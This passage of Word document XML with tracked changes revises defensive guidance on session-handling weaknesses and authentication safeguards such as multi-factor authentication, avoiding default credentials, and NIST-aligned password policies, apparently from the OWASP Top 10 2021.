        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65B0FBC4" w14:textId="14D14006" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2573" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2574" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Does not rotate Session IDs</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="51B78B7C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2575" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Reuse session identifier</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> after successful login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096EE280" w14:textId="3A91F06F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2576" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2577" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7DF402CA" w14:textId="0BC1AC64" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2578" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2579" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Does not </w:t>
      </w:r>
      <w:del w:id="2580" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>properly</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2581" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>correctly</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> invalidate Session IDs. User sessions or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151C0BBA" w14:textId="1FFF388B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2582" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2583" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> authentication tokens (</w:t>
      </w:r>
      <w:del w:id="2584" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>particularly</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2585" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>mainly</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> single sign-on (SSO) tokens) aren't</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFA9A49" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2586" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> properly invalidated during logout or a period of inactivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFDD9CD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54999445" w14:textId="1D28F986" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="2587" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2588" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D9EC37" w14:textId="47F95907" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2589" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2590" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2591" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Where possible, implement multi-factor authentication to prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D47C8F5" w14:textId="01D5F89C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2592" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> automated</w:t>
      </w:r>
      <w:del w:id="2593" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> credential stuffing, brute force, and stolen credential</w:t>
      </w:r>
      <w:del w:id="2594" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> re-use attacks. </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="65F523B6" w14:textId="08AF38D0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2595" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2596" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2597" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    reuse attacks.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0867EC9D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2598" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15ED014E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2599" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2600" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Do not ship or deploy with any default credentials, particularly for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4057BEA4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2601" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> admin users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013960FD" w14:textId="4523499F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2602" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2603" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="114A815C" w14:textId="75CC4339" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2604" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2605" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Implement weak</w:t>
      </w:r>
      <w:del w:id="2606" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>-</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2607" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>password checks, such as testing new or changed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725169C8" w14:textId="720F9F57" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2608" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> passwords against </w:t>
      </w:r>
      <w:del w:id="2609" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">a list of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:del w:id="2610" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">top </w:t>
      </w:r>
      <w:del w:id="2611" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>10000</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2612" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>10,000</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> worst passwords</w:t>
      </w:r>
      <w:del w:id="2613" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://github.com/danielmiessler/SecLists/tree/master/Passwords).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2614" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> list.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38540E50" w14:textId="5C60D1C0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2615" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2616" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0BB5DD78" w14:textId="095BAA6A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2617" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2618" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Align password length, complexity</w:t>
      </w:r>
      <w:ins w:id="2619" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and rotation policies with</w:t>
      </w:r>
      <w:del w:id="2620" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> [</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5AFE063B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2621" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2622" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    National Institute of Standards and Technology (</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NIST</w:t>
      </w:r>
      <w:ins w:id="2623" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5E41E3C4" w14:textId="0EA30AEB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2624" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2625" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
